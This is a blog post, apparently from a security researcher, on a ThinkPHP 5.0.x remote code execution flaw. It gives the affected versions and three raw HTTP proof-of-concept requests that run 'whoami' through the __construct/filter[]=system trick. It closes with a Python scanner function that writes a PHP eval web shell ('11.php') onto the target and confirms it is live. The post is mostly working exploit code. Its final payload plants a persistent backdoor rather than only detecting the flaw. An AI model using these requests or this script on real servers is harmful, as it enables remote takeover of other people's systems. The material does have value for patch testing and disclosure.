---
title: "Thinkphp5.x版本远程代码执行附python脚本"
date: 2019-01-11T18:17:40+08:00
lastmod: 2019-01-11T18:17:40+08:00
tags: ['rce','thinkphp','php']
categories: ['Vulnerability']
comment: true
---

今天thinkphp官方又双叒叕发布了5.0.24版本，包含了一个可能getshell的安全更新。在12月9日thinkphp爆出远程代码执行之后，今天晚上又爆出来远程代码执行，见[官方公告](https://blog.thinkphp.cn/910675)。

<!--more-->

### 影响范围

thinkphp5.0.0~5.0.23

### 各版本PoC

thinkphp5.0.10版本poc如图

![](https://y4er.com/img/uploads/20190509165156.jpg)

```http
POST /think-5.0.10/public/index.php?s=index/index/index HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

s=whoami&_method=__construct&method=&filter[]=system
```

---

在官网最新下载的5.0.23完整版中，在App类（`thinkphp/library/think/App.php`）中module方法增加了设置filter参数值的代码，用于初始化filter。因此通过上述请求设置的filter参数值会被重新覆盖为空导致无法利用。

thinkphp5.0.23版本**需要开启debug模式**才可以利用，附两个poc：
![](https://y4er.com/img/uploads/20190509162195.jpg)

```http
POST /thinkphp/public/index.php HTTP/1.1
Host: 127.0.0.1
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

_method=__construct&filter[]=system&server[REQUEST_METHOD]=whoami
```
---
![](https://y4er.com/img/uploads/20190509161167.jpg)

```http
POST /thinkphp/public/index.php?s=captcha HTTP/1.1
Host: 127.0.0.1
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 77

_method=__construct&filter[]=system&method=post&server[REQUEST_METHOD]=whoami
```

### 验证脚本
自己写的代码比较烂，直接放到POC-T中即可
```python
#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
# @Time : 2019/1/12 17:08 
# @Author : Y4er
# @File : thinkphp5.0.23-rec.py

import requests


def poc(url):
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        data = {
            "_method": "__construct",
            "filter[]": "system",
            "method": "get",
            "server[REQUEST_METHOD]": "echo ^<?php echo(md5(123)); @eval($_POST['x']);?^> > 11.php"
        }
        target = url + "/index.php?s=captcha"
        if "://" not in target:
            target = "http://" + target
        try:
            r = requests.post(target, headers=headers, data=data, timeout=10)
            rs = requests.get(target + "/11.php")
            if rs.status_code == 200 and "202cb962ac59075b964b07152d234b70" in rs.text:
                return target + "/11.php"
        except:
            return False
    except:
        return False
```